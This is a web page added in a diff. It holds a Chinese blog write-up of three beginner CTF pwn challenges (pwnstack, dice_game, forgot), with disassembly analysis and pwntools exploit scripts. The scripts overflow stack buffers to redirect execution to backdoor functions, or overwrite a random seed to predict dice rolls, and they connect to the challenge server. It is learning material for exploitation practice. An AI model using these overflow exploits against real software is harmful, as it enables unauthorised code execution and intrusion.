@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - pwn 入门刷题</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>pwn 入门刷题</h1>
+    <p>
+        <span class="meta">发布于: 2024-10-19 05:00</span>
+    </p>
+    <div class="post-body">
+        <p>攻防世界pwn题目</p>
+<h2>pwnstack</h2>
+<p>下载拖到ida64里反编译</p>
+<p><img src="/images/00pwn/0.png" alt="0" /></p>
+<p>进入到<code>vuln</code>函数，定义了一个160（0xa0）字节的缓冲区，存在一个<code>read</code>函数，会读取177（b1）个字节，导致栈溢出</p>
+<p><img src="/images/00pwn/1.png" alt="1" /></p>
+<p>查看汇编代码，看到后门函数，函数地址放在缓冲区后覆盖栈的返回地址<code>0x400762</code></p>
+<p><img src="/images/00pwn/2.png" alt="2" /></p>
+<p>或者通过<code>shift+f12</code>找到<code>/bin/sh</code>字符串，再通过在<code>/bin/sh</code>地址上<code>ctrl+x</code>找到它的引用，也可以找到后门函数的定义</p>
+<p><img src="/images/00pwn/3.png" alt="3" /></p>
+<p><img src="/images/00pwn/4.png" alt="4" /></p>
+<p>ctf wiki用一个很好的概念来理解栈的结构，如下</p>
+<pre><code class="language-txt">                                           +-----------------+
+                                           |     retaddr     |
+                                           +-----------------+
+                                           |     saved ebp   |
+                                    ebp---&gt;+-----------------+
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                              s,ebp-0x14--&gt;+-----------------+</code></pre>
+<p>从图中可以看出，<code>s</code>变量一共可以传入的字节大小为<code>14</code>,如果超过的话，多出的就会到<code>saved ebp</code>中，根据我的查阅<code>saved ebp</code>保存的是<code>栈帧</code>，根据栈帧确定变量的返回值，<code>x86</code>中<code>saved ebp</code>的大小为<code>4个字节</code>，<code>x64</code>中<code>saved ebp</code>的大小为<code>8个字节</code>，最后的<code>retaddr</code>就是溢出的部分，我们可以控制<code>retaddr</code>的值，将其修改为我们想要执行函数的内存地址</p>
+<p>看一下这题的文件类型，<code>64</code>位，所以<code>saved ebp</code>的大小为<code>8个字节</code>覆盖<code>saved ebp</code>，所以我们需要填充<code>0xa0+8=0xa8</code>个字节，然后，最后填入后门函数的地址<code>0x400762</code></p>
+<p><img src="/images/00pwn/5.png" alt="5" /></p>
+<p>最后发送<code>p64</code>函数包裹的数据，是为了让程序认为这是一个内存地址，不然接受的就是字符<code>0x400762</code></p>
+<p>编写exp：</p>
+<pre><code class="language-python">from pwn import *
+
+# 本地调试
+# p = process('./pwn2')
+# 远程
+p = remote('61.147.171.105', 53646)
+payload = b'a' * (0xa0+8) + p64(0x400762)
+p.sendline(payload)
+p.interactive()</code></pre>
+<p><img src="/images/00pwn/6.png" alt="6" /></p>
+<p>远程可以打通，本地打不通，这是什么原因。把后门地址改成<code>0x400766</code>时，本地和远程都可以</p>
+<h2>dice_game</h2>
+<p>ida64反编译，分析主函数，sub_A20，sub_B28等函数</p>
+<p><img src="/images/00pwn/7.png" alt="7" /></p>
+<p><img src="/images/00pwn/8.png" alt="8" /></p>
+<p><img src="/images/00pwn/9.png" alt="9" /></p>
+<p>分析这三个函数大概可以知道，这是一个游戏，使用当前时间生成一个种子，调用sub_A20函数使用这个种子生成50个1-6之间的随机数，等待用户输入，如果50道全对，调用sub_B28函数读取flag</p>
+<p>在ida里可以看到buf,seed在栈中，buf长度为55，seed长度为2，在0x10位置</p>
+<p><img src="/images/00pwn/10.png" alt="10" /></p>
+<p>可以通过buf，覆盖seed，从而控制种子，再利用题目给的libc库里定义的rand函数，就可以生成与题目一样的随机数</p>
+<pre><code class="language-python">from pwn import *
+from ctypes import * # 导入ctypes库，用于调用libc库中的函数
+#from LibcSearcher import *
+context.log_level = 'debug'  # 设置调试模式
+
+r = remote('61.147.171.105',54885)
+libc = cdll.LoadLibrary("libc.so.6")#利用题目给的libc库中的函数rand生成与题目一样的随机数。
+
+payload= b'a'*(0x50-0x10)+p64(0)
+
+r.sendafter('Welcome, let me know your name: ',payload)
+
+a=[]
+
+for i in range(50):
+    a.append(libc.rand()%6+1)
+print(a)
+
+for i in a:
+    r.recv()
+    print(r.recv())
+    r.sendline(str(i))
+
+r.interactive()</code></pre>
+<p><img src="/images/00pwn/11.png" alt="11" /></p>
+<h2>forgot</h2>
+<p>检测一下，32位程序，没有栈保护</p>
+<p><img src="/images/00pwn/12.png" alt="12" /></p>
+<p>反编译分析，定义了长度为32位字节的s，作为用户名来接收，可以随便输入。定义了v3，存入了几个函数的地址</p>
+<p>定义了长度为32的v2，使用<code>scanf</code>函数接收，没有限制长度，存在栈溢出</p>
+<p><img src="/images/00pwn/13.png" alt="13" /></p>
+<p>根据定义的v2,v3，发现缓冲区里可以使用v2溢出覆盖v3</p>
+<p><img src="/images/00pwn/14.png" alt="14" /></p>
+<p>在程序的最后有一处动态函数调用</p>
+<p><img src="/images/00pwn/15.png" alt="15" /></p>
+<p><code>shift+f12</code>跟进引用，找到<code>cat flag</code>的函数<code>sub_80486CC</code></p>
+<p><img src="/images/00pwn/16.png" alt="16" /></p>
+<p>所以需要把<code>v3[--v5]</code>也就是<code>v3[1]</code>的地址覆盖为<code>sub_80486CC</code>函数的地址<code>0x80486CC</code></p>
+<p>在这个循环中，会对输入的每一位字符进行检测，如果符合就更改v5的值，进入下一层检测，跟着他的要求做要找到合适的email格式，以及函数地址的改变，题目会变得更难，直接在第一个检测里找到不符合的字符，使每一位都不符合，这样v5就不需要改变了。在检测结束就可以调用目标函数</p>
+<p><img src="/images/00pwn/17.png" alt="17" /></p>
+<p>在第一个检测中，检查是否是小写字母、数字，或是特定的几个符号下划线、减号、加号、点，拿大写字母绕过就可以了</p>
+<pre><code class="language-c">_BOOL4 __cdecl sub_8048702(char a1)
+{
+  return a1 &gt; 96 &amp;&amp; a1 &lt;= 122 || a1 &gt; 47 &amp;&amp; a1 &lt;= 57 || a1 == 95 || a1 == 45 || a1 == 43 || a1 == 46;
+}</code></pre>
+<p>编写exp</p>
+<pre><code class="language-python">from pwn import *
+
+payload = b'A'*0x20 + p32(0x80486cc)
+# p = process('./forgot')
+p = remote('61.147.171.105', 61568)
+p.sendlineafter('&gt; ','test')
+p.sendlineafter('&gt; ',payload)
+p.interactive()</code></pre>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.cnblogs.com/Junglezt/p/17871927.html">BUUCTF-pwn-rip(第一个栈溢出) </a></li>
+<li><a href="https://blog.csdn.net/m0_73605862/article/details/130919537">攻防世界 pwnstack writeup</a></li>
+<li><a href="https://www.cnblogs.com/Mua2Uncle2blog/p/15505565.html">dice_game--攻防世界</a></li>
+<li><a href="https://blog.csdn.net/weixin_43876357/article/details/109028936">攻防世界（PWN）forgot</a></li>
+<li><a href="https://sphandsomejack.github.io/2020/02/17/forgot/">攻防世界进阶区forgot</a></li>
+</ul>    </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
